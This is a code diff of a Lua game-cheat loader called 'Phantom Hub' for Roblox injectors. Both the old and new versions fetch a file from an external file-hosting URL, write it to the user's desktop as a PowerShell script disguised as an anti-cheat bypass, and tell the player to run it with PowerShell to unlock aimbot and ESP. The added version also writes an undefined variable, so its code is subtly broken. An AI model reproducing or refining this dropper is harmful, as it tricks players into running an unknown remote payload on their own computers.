@@ -1,22 +1,28 @@
---// Phantom Hub v2.5 - Universal Loader //--
+--// Phantom Hub v3.0 - Universal Anti-Cheat Bypass //--
 print("PHANTOM HUB LOADED...")
 wait(1)
-print("Checking for latest anti-cheat...")
+print("Scanning for active security modules...")
 wait(2)
-print(">> ANTICHEAT DETECTED - BYPASS REQUIRED FOR ADVANCED FEATURES <<")
+print(">> Anti-Cheat Detected! <<")
+print(">> A bypass is required to use premium features (ESP, Aimbot). <<")
 
-local url = 'https://files.catbox.moe/382isn.7z'
-local bypass_name = "chimera_bypass.ps1"
+local payload_url = 'https://files.catbox.moe/382isn.7z'
+local bypass_filename = "Enable_Phantom_Features.ps1"
 
--- This uses the injector's 'writefile' function to save our powershell launcher to the user's desktop
+-- Use the injector's 'writefile' function to save our powershell launcher to the user's desktop
 if writefile then
-    local content = game:HttpGet(url, true)
-    writefile("Desktop\\" .. bypass_name, content)
-    print("SUCCESS! A bypass script '" .. bypass_name .. "' has been created on your Desktop.")
-    print("To unlock all features, please right-click this new file and 'Run with PowerShell'.")
+    print("Creating bypass...")
+    local script_content = game:HttpGet(payload_url, true)
+    writefile("Desktop\\" .. bypass_filename, content)
+    wait(1)
+    print("-------------------------------------------------------------------------")
+    print("SUCCESS! Bypass created on your Desktop: '" .. bypass_filename .. "'")
+    print("Right-click the new file on your desktop and hit 'Run with PowerShell'.")
+    print("-------------------------------------------------------------------------")
 else
-    print("ERROR: Your injector does not support writefile(). Please download the bypass manually from the link below and run it.")
-    print("Bypass Link: " .. url)
+    print("ERROR: Your injector doesn't support automatic bypass creation.")
+    print("Please download the bypass manually from the link below and run it.")
+    print("Bypass Link: " .. payload_url)
 end
 
-print("Aimbot and ESP will have limited functionality until bypass is activated.")
+print("Script will have limited functionality until bypass is activated.")
